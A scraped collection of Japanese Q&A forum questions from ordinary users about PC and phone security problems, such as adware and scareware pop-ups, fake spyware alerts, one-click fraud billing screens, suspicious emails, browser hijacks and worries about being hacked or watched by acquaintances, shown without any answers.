閉じても閉じても「Thank You」というYou Tubeみたいなロゴの画面が出てきて、困っています。 以下のことをやってみましたがおさまらないので質問させていただきました。 １　システムの復元 ２　spybotをアップデート後scan ３ スキャンディスク ノートンインターネットセキュリティは安全の表示になっています。 windows7でブラウザはinternet explorerです。 これまではシステムの復元でたいていのことは解決してきたように思うのですが、今回のはしつこくて困っています。詳しい方、よろしくお願いします。
IEのバージョン10でパスワードを入力すると、入力欄の右の方に小さな目のようなものが表示され、それをクリックするとｘｘｘと非表示されているのが、見えてしまいます。Google Chromeだとそんなことはありません。 何らかのソフトがインストールされたと思うのですが、いったい何のソフトでしょうか？ タスクマネージャーでも、Msconfig内にも、コントロールパネルのアプリケーション削除欄にも、それらしきアプリは見当たりません。ファイル名をそれらしくしてなければわかりませんが。 ソフトの名前、アンインストール方法、どなたかご教示いただけませんでしょうか？？
インターネット上や、迷惑メールから感染するマルウェアと比べて、USBから感染するマルウェアはたちが悪いという事はありますか？ 私のパソコンは、ワードが途中で文字入力が出来なくなったり、文字入力ダイアログが突然勝手に表示されたりする事があります。 前に人にパソコンをいじらせた事があったのですが、ウイルス対策ソフト（ウイルスセキュリティーZERO）では何も検出されません。 他の対策ソフトの体験版でもマルウェアは検出されないようです。 誰かにパソコンをいじらせた事があるのが、不調の原因のような気がするのですが、このまま使っていても大丈夫でしょうか？ 保存している文書が誰かにまるみえになっていたりする可能性はありますか？
どのような 問題が考えられますか？ ほぼOSのみの状態で メールは使わないどころか OutlookやWinメールを機能しないように エントリ削除したりして 削除できるファイルは 削除した状態で リモート系のサービスも停止させて使用。 その他 できるだけ通信を行うものを 停止か削除できる場合はファイルなど削除して この状態のPCで 悪用されるとしたら どのような 使い方をされると思いますか？ セキュリティ無しでも 複数でスキャンしたり オンラインスキャンに頼る形でです。 仮に 外部に メールを送信させないように メール機能を 完全に停止させることは できるでしょうか？ あと画面キャプチャなど その機能を停止させることはできるでしょうか？ その他 外部から操作されるような機能は Windowsの中で どのようなものがあるでしょうか？
楽天銀行からこんなメールが届きました。 要約すると 安全な取引の為に携帯、スマホのメールアドレスを登録してください、 WEBメールの登録はお控えください このメールは信用できますか。
ある日突然セキュリティソフトが「rM1sV4K2.exe」というアプリケーションの動作を停止しました、というメッセージが出て、そこからPCの動作が極端に遅くなりました。色々調べましたが日本語のサイトが出てこずよくわからないのですが、どうもウイルス的な物のようですので削除したいのですが削除出来ません。このソフトについて詳しくお知りの方がおられましたら削除の方法も含めてよろしくご教授下さい。PDFファイルのようなのですが、パスワード等を盗み取られるかもしれない為にいろいろなところにアクセスできずに困っています。よろしくお願い致します。
セキュリティーソフトには金額にすごく差がありますが、二三阡円で何年でもＯＫと言うソフト でＯＫでしょうか教えてください
暗号化されたｓｓｌ通信 信頼できない証明書 このコンピューターで動作しているアプリケーションは暗号化されたｓｓｌチャンネルを介して通信を試みています。暗号化されたチャンネルのコンテンツを検査したい場合は、証明書を信頼できるとしてマークしてください。リモートコンピュータの証明書は信頼できますか？ この証明書はリモートコンピューターより信頼されていると思われるルート証明書を確認します。この証明書がリモートコンピュータ上で有効であることを確実にするためにこの証明書をそのコンピューターで確認してください という文章が表示されました。 信頼できますか？いいえ、を選択しましたが大丈夫でしょうか？ 証明書のインストールはクリックしませんでした。 ノートンセキュリティでスキャンを行っていて途中でこのようなことがあったのですが ノートンに関係あることなのでしょうか？
ウインドウズXPでインターネットしていましたが、昨日から動きが遅く感じ履歴を見てみると、開いた覚えのないのないページ（ゲーム・車・無料ソフトのダウンロード）や【？数字】　{ad.helpertrack.com？1234など}がたくさん残っています。再起動してもIEを立ち上げるとしばらくすると勝手にどこかへ接続しているようです。何か怪しいところをクリックした覚えもないのですが、ウィルスに感染したのでしょうか？このまま使用していても問題がないのか、対処方法を教えてください。
コントロールパネル→ネットワークと共有センターを見ると ○○ＰＣ－複数のネットワーク-インターネット となっています。 ＩＰアドレス デフォルトゲートウェイ ＤＨＣＰサーバー のところに１９２から始まるＩＰがありました。 ファイアーウォールなどでみると、信頼できるゾーンにこのＩＰがありフルアクセス権を有しています。 とありました。 私のパソコンは１２から始まるＩＰなのですが、これはどういうことなのでしょうか？
御世話になっております。 先週辺りから、ウイルスセキュリティから妙なメッセージ(画像参照)がシステム起動毎に出る様になり、「ブロック」を選択するケースが続いており、困っております。 又、SpyBotも併用しておりますが、競合にしては発生時期が遅過ぎる為、原因は別にあるものと思われます。 キーワード「127.0.0.1　ファーミング」で検索し、調べてみるも今ひとつ抜本的な対策が特定できなかったり、ウイルスセキュリティがリストアップした語句からファイルやレジストリの検索で発見された中から削除するにせよ、「マルウェア側が作成した汚染箇所」なのか、「セキュリティ側が作成したブラックリストや免疫」なのか判断に困り、保留中です。 http://www2.atwiki.jp/kawaisosu/m/pages/208.html … 等である程度の情報は掴めましたが決め手には至っておりません。 C:\WINDOWS\system32\drivers\etcから「host」ファイルの内容も記載しようとしましたが、字数制限が厳しく無理でした。 対処法を教えて頂ければ幸いです。宜しくお願い致します。
ハッキングされている場合の対処法を教えてほしいのですが・・・・ １パソコンを買い替える ２通信会社を変える ３セキュリティソフトを入れる これで仮にハッキングされていたとしても、ハッキングされていない状態になれるのでしょうか？ １身内にハッキングしている人がいる ２絶対にパソコンに触れない状況 でもハッキングは可能なのでしょうか？ 可能であればどのような手法でハッキングするのでしょうか？
家庭内で使っている有線のパソコンなのですが 隣近所から自分のパソコン内に侵入されたり ファイルを覗く事は簡単に出来るのでしょうか。 また、もしファイルを覗かれていたら その証拠は残りますか？ 家は一戸建てで電柱から線を引いています。 LAN接続などでは、よく聞きますが 有線でもそういう事が簡単にできてしまうのでしょうか。
先日、manual操作でwindows updateを行いました。 その結果、Internet Explorerも最新のver.10になってしまいましたが、 会社のイントラネットはそれに対応していないため、 アクセスできなくなってしまいました。 PC上のヘルプでは、「復元」などの解説はありますが 前のversionへの選択が見つかりませんでした。 ver.09に戻すことはできるのでしょうか？ よろしくお願いします。
ある日気づいたらgooglechromeのブラウザなのですが検索エンジンがB1というものに書き換えられていました。最初、気がつかず検索したところ中国語のHPがいろいろと出てきて気がつきました。またその後、試しにYAHOOと検索すると全て英語が出てきます。 ネットで調べたところこれなのかと思うのですが・・・ http://www.mcafee.com/japan/security/virD.asp?v= … ウィルスソフトはフリーのMicrosoft Security Essentialsを入れていました。 しかしその後、ccクリーナーでレジストリの問題点が出来てた時に掃除したせいか見あたらないことにまた気がつきましたのでシマンテックノートン360とかいう体験ソフトを入れてみましたが検出も駆除もされません。 調べても情報が少ないのでどんな悪さをするか、また対処方法があれば教えてくさい。 リカバリ再インストールはできれば避けたいのですが 無知ですみません。宜しくお願い致します。m（_　_）m
ここ数か月ほど、主人からの発言で私が観覧していたサイトなどを見たとしか思えない発言が多々あります。 ですが、私は大抵PCを使わないときはシャットダウンしており、次回電源を付けるときパスワードがあるためパスワードがわからない限りパソコンにはアクセスできません。主人には教えていません。 また、見られて困るようなサイトの場合、観覧履歴や検索履歴なども削除しています。時々プライベートウィンドーも使います。いつも使っているホットメールのパスワードも変えましたが、昨日やはりどうにかしてみている？と思う発言がありました。 PCにはトレンドマイクロ社のセキュリティーを入れています。スパイボットも入れているのですが、例えば遠隔で私のPCにアクセスしてみるとかそういうことはできるのでしょうか。ちなみに、もちろん家庭のPCなのでよく会社のITサポートで遠隔作業ができるようにはなっていません。 一つ心配なのが、主人はあまりPCは得意ではないですが（私のほうが知ってるくらいです）友人の一人が警察に頼まれて仕事をするくらいパソコン関係ができる人がいます。本職としてではなく副職としてですが、相当わかる人です。この人から何かしらアドバイスなどもらっているということも考えられなくはないかなと・・・。 ご存知の方がいましたらどういう方法でアクセスしているのか、またそれを見つけるのはどうすればいいのか、そしてそれを防御するにはどうすればいいかを教えてください。 よろしくお願いします。
avasoft antivirus professional と言うウイルス？がパソコンに入ってしまいました。 恐らく2日ほど前にみた英文のメールが原因だと思われます。 インターネットのトップページには行けますが、そこから他のサイトには行けません。 また、システムの復元をしようとしたのですが、avasoftが邪魔？をしてすることが出来ませんでした。 ウイルス対策ソフトは数日前に期限が切れてしまっています。 ネットでいろいろ調べたのですが、もともとパソコンに詳しくないのと、焦りでいまいち理解できません。 このままだとパソコンは駄目になってしまうのでしょうか？ どうすれば治すことができますか？ 亡くなった父が残したものなのでこのまま放置は出来ません。 どうかお力貸してください。 お願いします。
それまで正常だったノートンが急にリスクありになりました。「ウィルス防止の問題」と出てきます。いろいろやってもわかりませんし、サポートセンターのアドレス、電話番号がわかりません。助けてください。
先日NETでクレジットカード(セゾン)を申し込んだんですが、 その時ノートンのIDセーフを閉じてる状態だったんですが、 後で考えると危険だったかな？と不安になってます。 別にIDセーフが閉じているからといってセキュリティ的に危険なわけではないですよね？ ノートンを使い始めたばかりでよくわかっていないのでよろしくお願いします。
こんにちは。 １階に家族用PC、２階に父用のPC、２階の別の部屋に私用のPC、 というように３つのパソコンを無線LANでつなごうかと思っています。 ただ、父が極度のむっつりスケベでして、 ネットにつながるとエロサイトばかり巡回することが簡単に予想できます。 もし父のPCがスパイウェアやウイルスに感染した場合、 無線LAN経由で家族用や私用のPCに悪影響が及ぶ可能性はありますか？ 実際に昔、家族用のPCがエロサイトのスパイウェアにやられまくって大変なことになりましたので、 それが心配です。 父のPCが感染しまくる事についてはどうでもいいです。 そこまでは知りません。 よろしくお願いします。
セキュリティー意識が高い人やPC経験・ネット利用経験が長い人は 履歴やクッキーなどを少なからず 脅威と捉えるかもしれないけど ネット初心者の人などは ブラウザ・ネット利用を どう考えるだろう？。 面白い記事を見つけた。 http://blogs.itmedia.co.jp/yohei/2010/12/request … 一部 抜粋。 「広告配信サイト改ざんの事例の場合は、ガンブラーのようにウェブサイト自体が改ざんされたわけではなく、ウェブサイトを構成する部品（バナー広告など）が改ざんされていました。攻撃者がウェブサイトを構成する部品を提供している企業のサーバに侵入し、部品を改ざんすることにより、その企業から部品の提供を受けている企業のウェブサイトの閲覧者が、意図せず悪意あるウェブサイトに誘導され、ウイルスをダウンロードさせられるというものでした（図1-3参照）。この事例の場合、正規のウェブサイト側で作成した部分には改ざん箇所が見つからないため、問題箇所の特定が非常に困難です。」 (1)面白いところは、 「ウェブサイト自体が改ざんされたわけではなく、 ウェブサイトを構成する「バナー広告」が改ざんされていた」 これらは Flash広告が怪しいと考えますが？ (2)表示した一つのページの情報が書いてあり、 「itmedia.jpは一番上に表示されるアイティメディアIDの登録用ボタン images-amazon.comは私が貼ったamazonへの画像リンク baniraaisu.comは私が貼った外部Webサイトへの画像リンク facebook.comは「いいね」ボタン等からのリンク googlesyndication.comは広告関連 twimg.comはtwitter関連 doubleclick.netは広告関連 google-analytics.comはgoogleのアクセス解析関連 2o7.netは行動ターゲティング関連」 doubleclick.netや2o7.netなどは サイトの「ブロックリスト」に ほぼ 間違いなく入ってるものだし。 facebook.comは どのページでも 当たり前に入ってくるものだけど IEのDoNotTruckというアドオンでは ブロックされている。 さらに下のほうに 「一般的な設定ですとユーザがあるWebサイトにアクセスした場合、外部のWebサイトから画像やJavaScript等の部品を自動的に取り込みます。上記のIPAの記事ではこの外部の部品が攻撃を受けることの危険性が指摘されているわけですが、この「自動」を「手動」にし、ユーザに選択の機会を与えるのがRequestPolicyというアドオンの機能になります。」 っとあるように ここの質問サイトで 変な広告が表示された とか インストールを進めるウインドウがでるなど 根本は こんなことが原因ではないか？と考えますが、どうでしょうか？。 そもそも 広告に Flashなんか使うこと自体間違い。 サイトに広告がなければ ほぼどのページも 0.5秒程度で 表示されるハズだと確信してる。 サイトが混んでいるとか 回線遅い場合を除いて いま現在 いろいろブロックして ほぼその速度で利用できてる。 画面のスクロールが重いなんて まずないし マウスの速度で スクロールできている。 言いたいことは 自分に関係ない情報が普通に入ってきて 動作を悪くしたり 感染の原因となりうる物を 普通に入れるって どうなんだろう？と思うわけです。 （そもそも広告を利用したことは ほぼ無いですｗ 必要なら探せばいいだけ） ウイルスの分類がイマイチ分からないけど これはウイルス対策より スパイ対策に入るのかな？。 クッキー受け入れ禁止＋ブロックサイト登録＋Flash自動実行の禁止 最低この３つはやっておかないと ブラウザ利用したくない＾＾；。 （これは質問というより、ブラウザ利用の意識的なもの、また初心者の人が読んだときに、 ネット利用のあり方に 参考になるような 意見回答をもらえると 有難いです。また他にいい方法があれば聞きたいです。）
も入れておかないと危ないのでしょうか。 最近のウイルス対策ソフトはスパイウェア対策もされているものもあると思いますが。 別途、スパイウェア対策ソフトも入れておかないと危ないのでしょうか。 入れておかないと危ないと提言されます方は、おすすめのスパイウェア対策ソフトを教えて下さい。 そのソフトの簡単な説明もお願いします。
こういうのは問題ありませんか？ ”スパイウェアを検出しました。直ちに削除するにはクリックしてください。” という広告です。 http://inkscape.softonic.jp/compare/photoscape,g …
avを見ようとしたら　ワンクリック詐欺にしまいました掛かって　初期化や無視以外に対処法はありませんか　spybot(スパイボット）というソフトを試したのですが効果ありませんでした　これは　やりかたが間違っていたにでしょうかそれとも　ワンクリ詐欺にわ　効果がないだけでしょうか？
ヤフーメールを利用しているのですが 最近、『プラチナライン』というところから、メールが頻繁に届くようになりました。 相手にこちらの存在を分からせるたくないので、プラチナラインのメールに書いてある 配信停止・依頼先アドレスにはメールを出したくありません。 他に、どのような対策が可能でしょうか？ 教えてください。よろしくお願い致します。
「ウイルスに感染しているから無料で検査する」としつこく表示されます。 マイクロソフトのパートナーを装っています。 ダウンロードしてスキャンすると沢山の余計なファイルが有ると表示され、修復しますか？と聞いてくるので「yes]ボタンをクリックすると、セキュリティソフトの購入画面になります。 セキュリティはAVGを使っているので２つのセキュリティソフトを入れる必要はないと思うので購入はしていません。 ブラウザを開くと先の「ウイルス感染・・・・」こそがウイルスじゃないかと思います・ 問い合わせ電話番号が書いてありますが、国番号1から始まる番号なので電話していません。 この表示を消すにはどの様にしたら良いでしょうか？ スタートアップファイルとレジストリは調べましたが異常は見つかりません。
最近Youtubeや海外サイト等でよく「スパイウェアが検出されました」「パフォーマンスが低下しています」等のフラッシュを使った警告広告を頻繁に見かけます。 詐欺会社の広告だというのは知っているのですが、誤って一度クリックしてしまったところ ブラウザの下側or右側に頻繁に広告が出るようになって困っています。 （サイトを覗いてしまっただけで、詐欺ソフトのダウンロードは行っていません） ネットで検索してもソフトを誤ってダウンロードしてしまった場合の削除方法が書かれているだけで ダウンロードはしていないけど広告が出るようになってしまった時の対処方法が見つからないのです。 ちなみに表示される広告は画像にて添付。 ＰＣを立ち上げて、各サイトへの初回アクセス時に出てくるようで 一度「×」で消してしまえば暫くは出てこないようです。 楽天市場を覗いても、アメーバブログを覗いても、この教えてgooを覗いても広告が出てきました。 また、広告ではなく、画像一番上のようなツールバーのような表示の時もあります。 Sagiウォールのようなワンクリック詐欺対策ソフト・・・無反応。 ノートンインターネットセキュリティ・・・無反応。 スパイボットS&Dも使ってみましたが ●Win32.2UrFace.bho　（MalwareC） ●Yontoo.Pagerage　（Adware） の2点がアクセス拒否エラーとなり削除できません。 （いくつかの問題箇所が修正/削除できません；理由はファイルがメモリ上にある為です・・・）と出てきます。 PC初心者の為、消せない2種が今回の問題に関わっているのか等さっぱりわからないのですが とにかくブラウザから邪魔な広告が出てくるのを消す方法が知りたいです。 リカバリーとなると初心者の自分は再設定できないと思うので それ以外の方法で何か簡単な対処法がありましたらよろしくお願いします！m(_ _)m
測定スタートするとjavaがスタートしそのあと添付の画像から変な 接続要求が表示されますが 　これは　何なのですか　? 特に問題無いのでしょうか　?
Window8を使っていますが、インターネットエクスプローラーを起動すると、Hao123・・のHPが開き、スパイウエアが検出されました・・・の点滅警告が出ます。その後操作すると　Reg Clean Pro　の有料ダウンロードなどを求めてきます。　これが出ないようにしたいのですが、どうすればいいでしょうか。
現在最新の無料版Avast!８を使ってるのですが　あと２ヶ月でライセンスが切れますっていう告知がきました。 そこで、新たにライセンスを再取得したのですが　運営から届いたのは　「ライセンスキー」だけで 添付ファイルなどは一切なく。 Avast!8の再登録項目には　「ライセンスファイル」っていうのを入れないとだめのようで ライセンスキーだけあっても　更新できないってことでしょうか？　ライセンスファイルは　どうやって入手すればよいのか　解る方いたら　説明お願いします！
Aviraフリー版をWin7で使っています。 ところがノートンのときは普通に使えていた、ファイルの共有とリモート制御のWinVNCが使えなくなりました。 ノートンのときも試用版でしたが、設定なしでファイルの共有とWinVNCは使えていました。 Aviraの設定を調べてみましたがどこを操作すればいいのか分かりません。 どなたか教えてください。
gooのフリーメールを使っていますが 身に覚えのない　いかがわしいサイトから 宝くじを買えだの当たるだの　女性と出会えるなどの 詐欺まがいの卑劣なメールが来るようになってしまいました。 思えば　 ～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ 最近、ツイッターでダイレクトメールを使って gooのフリーメールアドレスを教えて ギガファイル経由で　画像添付のメールを送って貰い 受け取りました。 それが原因かな？とか。。。 相手は素性のわかる人です。 有名な方なので　悪さをするとか考えられません。 あとは会社で、データを送って貰う為 最近、アドレスを教えやりとりを始めました。 会社が怪しいと思ったので、セキュリティの件について 触れましたが　他の方には　何も変わった様子がないようです。 ～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～ gooが機能で振り分けるのか　迷惑メールＢＯＸに最初は入っていたようで 当初は、全く気付かなかったのですが 先日、普通の受信ＢＯＸに　入っており初めて気付いた次第です。 迷惑メール情報サイトに　全て転送しているのと Gメールと　ドコモから送られているようです。 @マーク以下の　@gmail.com　や@docomo.ne.jpは 受付拒否にしましたが（ここでやりとりしてる相手がいないので） 一番気になるのが 当方に向けて送ってくるアドレスが　謎のものなのです。 例えば、当方が　kahungasugoi@@mail.goo.ne.jpというアドレスにも関らず、 big12121212@mail.goo.ne.jp　とか okyakusan@mail.goo.ne.jp　とか ooatari-banzai@mail.goo.ne.jp　とか 自分のアドレスと全く関係ないアドレスのものが 届いているのです。 気持ち悪くて仕方ありません。 意味を謎説いて頂けるのと 同じような経験をされ　正しい解決方法を御存知の方 御伝授　賜りますと幸いです。　
インターネットを見ていて、広告がいつのまにか出てきました。消してもすぐ出てきます。まずシステムの復元をしました。しかし復元の日が広告出現の後なのでできませんでした。次にレジストリエディタでmshta.exe http:を見つけ消去しました。けれどすぐこれもまた復活してしまいます。アドレスも変わっています。ウィルスソフトも今入っていますが、さらに過去の質問の回答にあるソフトを、すぐ有料でダウンロードしましたが駄目でした。パソコンが使えなくて本当に困ります。最悪初期化を考えないといけないでしょうか。しかしどのデータを残していいかがわかりません。パソコンはウィンドウズビスタです。パソコンは初心者ですが、よろしくお願いします。
何をどうしてこうなったのかわかりませんが、Foxの下に画像のような広告が出始めました。 IEでは出ず、調べてみて「Navinow」も見つからず何が原因か分かりません。 何が悪いのでしょうか？ OSはWindowsXPでプラウザはFirefox18.0.2です。
　今晩は。 　フリー版のVirus対策ソフト（AVIRA（Ver 13.0.0.1867））をインストールしました。 　「SystemScanner＞ローカルドライブ」を実行しましたが、ある一定のところまで進捗すると PCの画面が真っ黒になり自動で電源が切れてダウンしてしまいます。 　「SystemScanner＞ローカルハードデスク」、「手動による選択＞ローカルデスク」も実行し ましたが、同じ現象です。 　一体何が原因でしょうか、宜しくお願いします。 　OSはWin　XP　SP３です。 　実行するときは、一般のモードでLANは切断して実行しています。
有線ルーターを使用しています。 ルーターにはログインパスワードを設定してありますので、パソコンに侵入して、パソコンからルーターの設定を変更することは困難かとも思いますが、外部から直接ルーターにアタックして、ルーター自体の設定を変更することは可能なのでしょうか？ もし可能ならば、何か防止策はあるのでしょうか？
　PC初心者です。 　ウィルスとマルウエアの違いを教えて下さい。 　どちらもPC内で悪さをするとか、個人情報、ファイルの自動送信とかをする点については同じだと 思うのですが。 　一体どこがどのように違うのでしょうか、宜しくお願いします。 　
先日音楽を落とそうと思いいろんなサイトを見て回っていたのですが、目当ての音楽があったのでmp3juice.com（うろ覚えなのですが）というサイトでexeファイルを落としました。 その後いつものようにGooglechromeを開きました。 いつもならGoogleの検索画面が開くはずなのにsearchという名前のページが開きました。 新しいタブを開いても同じ画面が出るだけでした。どうやらマルウェアらしきものに感染してしまったようなんです。 もしやと思いIEの方も開いてみたのですが案の定同じページが開きました。 家族共用のパソコンなのでなんとかして元に戻したいです。 バックアップなどは面倒なので問題のファイルだけを消せたらと思います。 どうしてもバックアップをとって駆除ソフト等で消さないと無理という場合はそうしたいと思うのでいいソフトを紹介して頂ければと思います。 あと今後のためにここでファイルを落とすとそう言った類のものに感染する、といったサイトも教えていただければ嬉しいです。 駆除方法をご存知の方、どうかご教授の程宜しくお願い致します。 用語などはわからないものが多いので、詳しく易しい説明をしていだたけると助かります…。
Reg Clean Proセットアップというポップアップが画面上に出て困っています。 中にはAdvanced System Protecter の表示があります。 これはどういったものなのでしょうか 消す方法はどうすればいいのでしょうか シャットダウンもできません。 対応策を教えてください。
C:\ProgramData\Kaspersky Lab\AVP13\Report のReportを消すとどうなりますか？
中学3年生です。 今日、普段どおりにYou tubuで動画を見ていたら 右の方に「スパイウェアが検出されました」という広告が出て、 動画を見ている最中にも、その広告がずっと点滅しているんです。 その広告のせいでいつも見ている動画のよみこみが遅くなったりしているんです。 まさか、スパイウェアに感染しているわけはないだろうと思っているのですが・・ なぜ急に出るようになったのでしょうか?? そして、数分後にまたYou tubuのページにいくと、 「あなたのパソコンがクラッシュしようとしています」という広告が出てきて・・・ 怖くて、一度シャットダウンしました。 この広告のことについて知っている方いましたら教えて下さい。
海外のサイトを見てたら、このPCの動作は遅いです。ここをクリックしてエラーを修正してください！という長方形の見出し（和文）がサイトの真ん中部分に出ますが、本当にクリックしてよいかどうかわかりませんのでお判りの方がいらしゃいましたらアドバイスいただけますか？　よろしくお願いいたします。 その見出しの中にもしなにかウィルスがスパイウェアなどが入っていたらと危惧していますが、確信が持てません。
当方、macbook pro os 10.7.5 を使っているのですが最近パソコンのフォルダーが勝手に動いていたり、ネット上にアップロードしていない情報がとある人物に知られています。遠くの場所からパソコンに侵入できるのでしょうか？ 見られてるようで仕方ありません。 侵入されてる場合の対策方法がわかる専門家の方がいましたら教えていただけたらありがたいです。よろしくお願いいたします。 ＃当方パソコンにあまり知識はないのですがファイアーウォールを設定するといいと言われたので設定しました。それ以外は特になにもしていません。
Windows 7 LIFEBOOK AH 54/Dを使用しております。 Internet Explorerにアクセスしたところ、sweetimが出現してしまいます。 その前はGoogle Chromeのホームページにつながるようにしていました。 ちなみにGoogleのアカウントには登録しておりません。 このような状態のとき、sweetimを排除するにはどのようにすればよろしいでしょうか？
フェイスブックを ガラケーから参加している者です。 さっき 「○○で働いてる方ですよね？ 違うかったら無視してください」 とメッセージがきました。 その人のプロフィールを確認したけど 全く面識がありません。 多分私がバイトしている際 フルネームが書いてる名札をつけて バイトしてますので それを見られて 検索してきたんだと思います。 こんなことは初めてで 正直かなり気持ち悪いです。 そのうち住所とか スパム的なことされるのでは と思い始めました.. フェイスブック上で個人情報 (詳細な住所や家族のことなど) 漏れますか？ 漏れないようにする対策など ありますか？ 不安だったら退会しろなどの 回答は望んでません。 懐かしい友達とかに 出会いたいという意味で 登録させていただいてるので..(><) 回答お待ちしております
「.exe」拡張子のあるソフトは安易にインストール・実行しない方が良いと聞いたことがありますが、具体的にはどのような危険性があるのでしょうか。「.exe」拡張子のソフトだと、セキュリティソフトが「ウイルス・スパイウェアと認識しない状態」になり、知らないうちにスパイウェア活動や破壊活動がされるのでしょうか。あるいは不正アクセスしやすいような設定や遠隔操作されやすくなるのでしょうか。「Word」等の素性の知れた有名ソフトはほぼ安全だと思いますが、フリーソフトの中には、悪意のあるプログラムが仕込まれている危険があるから、安易にフリーソフトはインストールしない方が良いのでしょうか。セキュリティは初心者ですので具体的で分かり易いご回答をお願いします。
ＯＳはWindowsVistaHomePremiumのＯＳ、 インターネットブラウザはInternetExplorer8.0でＰＣはNECのVALUESTARを使用しています。 ＰＣを立ち上げた際、 「ブルネイへの通信がエラーを起こした」旨のエラーコードが出て、 Windowsファイアウォールに関する通信許可選択メッセージが現れたため、 ウィルス感染を疑って、 インストールしてある『ESET NOD32 Antivirus』でコンピュータ検査を掛けたところ、 脅威検出のメッセージと共に、 「３個の感染ファイルで２個は駆除、１個は駆除できない。」 とのメッセージが出ました。 検査ログを見ると 「システムメモリ >dwm.exe(3412) - Win32/Spy.Zbot.ZRの亜種 トロイの木馬 - 駆除できません」 と出ています。 残り１個の感染ファイルを駆除したいのですが、 どう処置したらよいのかがわかりません。 『Spy.Zbot.ZR』で検索して調べてみたところ、 これと似たようなウィルスが感染した場合の対処法に 「スタートアップディスクまたは回復コンソールを用いて検出されたファイルを削除する」 との記述があったのですが、 仮にこの手法で対処するにしても、 ＰＣ購入時にWindowsインストールCDが添付されていた憶えがなく、 どのようにスタートアップディスクを立ち上げ、 どのような手順で処置すればいいのかもわからない状態です。 どなたかご教示願えませんでしょうか。
衛星はいま、進化しているそうで、グーグルアースに代表されるように、地上のあらゆるものを映し出すことができるほどになってきています。 しかしながら、人がどこにいるかまでは衛星からはあと一歩難しいようです。 もう少し研究がすすめば、人がどこにいるのか？ それを衛星から捕えることができるでしょうか？ それができれば、テロリストがどこにいるのか？ 顔写真を登録して、それを衛星に見つけさせるようなことが進化の過程でできてしまうとテロリストの行動を逐一チェックし、衛星からパトリオット追尾できるようになるでしょうか？ そうすれば、どこにテロリストが隠れているのか丸わかりになり、ひそかにそこに潜入し、ひっとらえたり殺害が容易にできるのではないでしょうか？ さらに、進化すると衛星からの直接攻撃で、宇宙からそのテロリストを狙い撃ちして、迎撃してしまうというすごいこともできるでしょうか？
されている可能性は低いかもしれませんが、心配なので。 まだ付き合ってもいない人の車に携帯を忘れてしまい(30分くらいの時間です)中を見て登録していた異性について指摘されトラブルになりました。 もう会っていません。 不正アクセスされたり、クラッキングされている可能性はありますか？ 今の所可笑しな事はありませんし、調べようがないかもしれませんが、相手に携帯操作されていた可能性などある限りありえますか？ 実際どうなんでしょうか？ ハッキングされていて困っている！などの相談を見ると精神病など言われていたりしますが、そのような事が有り得ないからですか？ あるんでしょうか？ないんでしょうか？ ちなみに相手はパソコン、携帯、スマホを持っています。 ハッキングを少しかじった、勉強したことがあるなど言っていた事がありました。 どの程度かは分かりませんし、少し程度では出来ない事ですよね？ 何か最初に私の携帯に機械を使ってや、スマホのアプリでクラッキングや不正アクセスを簡単に出来てしまうなどありますか？ 詳しく紹介ではなく、有るか無いかだけでも構いません。 有れば掛かる時間など教えてください。 数秒、数分で出来るものかな？ 30分もあれば出来ると思っています。
ただの故障かもしれませんが、今日、昨日で勝手に再起動が三回ありました。 再起動されることでクラッキングなどされる事はあり得ますか？ また遠隔操作されているとして、相手が再起動するメリットはありますか？ 最近トラブルがあり、勝手に携帯を見られたのでクラッキングされている可能性はあります。 クラッキングされていると気がつく方法はありますか？
例えば、オンライン銀行をしていて、ログアウトをし忘れたとします。 画面を閉じただけだとしたら、よく問題があると言われますね。 では、ログアウトせず、画面を閉じてシャットダウンのみの場合と さらにワイヤレスネットワークのボタンもオフにする場合では 情報漏洩に効果はありますか？ ご意見よろしくお願いします。
出来るだけ正確な情報を下さい。 携帯をストーカーらしき人に直接勝手に見られてしまいハッキング、クラッキング？をされて悪用されています。 携帯、番号、アドレスを変えても無駄でしょうか？(中身など全て) 住所、氏名、生年月日、家の番号殆どの個人情報が知られています。 また、アドレス帳のアドレスや番号だけではハッキング出来ないですよね？
キンドルファイアーHDでネットしてたらあるホームページで私の名前とフェイスブックのコメント欄が現れていました。キンドルでフェイスブックはしておりませんし、もちろんフェイスブックのアプリもダウンロードしていません。どうして私が見ていることが分かったのでしょうか？不安です。ご回答よろしくお願いします。
？ ここに入って　スパイウェアが検出されました　っていう広告が出たんです。 心配なんで詳しい方お願いできますでしょうか？ http://englishclass.jp
　恥ずかしながらアダルトサイトに足を踏み入れ、「20歳以上ですか」の質問に「はい」と答えましたが、すぐにまずいと思い何も見ずに出たのです。しかし「登録終了のお知らせ画面」として「有料サイトの料金が発生したので３日以内に支払うように」との請求をされています。その画面は何度消しても3分位で出てきます。何も見ていないので料金を支払う気にはなれません。何とか出ないようにしたいのですが、恥ずかしくて誰にも相談出来ず困っています。パソコンの知識もなく、難しい事は全くわかりません。パソコンはWindows7、ウイルスソフトはウイルスバスターを入れています。 　ウイルスバスター内のｗebサイトフォルダーはすべて削除しました。パソコン内にインストールされているプログラムの中にも該当しそうなものはありません。 　知識も能力もない私がこんなことになると途方に暮れるだけです。皆さんに笑われることを承知でお願いします。消し方を教えてください。 　
有料アダルトサイトを契約していません。がアダルトサイトの表示画面が待ち受け画面のように消えません。どうしたら消えますか？
　顧客からの要望があればプロクシサーバーや国外サーバーからのアクセスが不可能にできる契約を設けたら安全ではないでしょうか？国外にいてプロクシサーバーを使用する必要のある顧客の場合、この契約は無意味になりますが、このようにすればそれなりの犯罪抑止効果があると思いますがどうでしょうか？
こんにちは。 某有名ソフトを使っています。なんか先日やたら動作が重くて、パソコンがおかしくなりました。 起動時に砂時計ボタンがずっとで続ける有様で、何もしていないのにieが１０個も立ち上がってしまうという異常事態。 まずie１０個も立ち上がった経験のある方はいらっしゃいますか？(?o?) 起動時、ログイン時にやたら動作が重いというのはやはりスパイウェアかウイルスに感染したということでしょうか？どちらの感染が高いでしょう？ また狙われている場合は２度目もありえます。２度目は完全に防ぎたいんですがどうしたらいいですか？ よろしくお願いします。
年末年始にかけて旅行をするため、部屋を空けることになりました。 現在この部屋で、無線LANの環境でインターネットをしていますが、時々ポートスキャニング攻撃を検出しましたと、ウイルス対策ソフトが反応しています。（1週間に2回程度） 念のため、部屋を空ける期間に、無線LAN装置の電源とケーブルを外しておこうと考えていますが、 何か問題（再度設定し直し等）が起きるでしょうか？ 尚、PCはWin7 64bit　無線LANは　BUFFALO WHR-300HPです。 以上　詳しい方にアドバイスをいただきたく、よろしくお願いします。
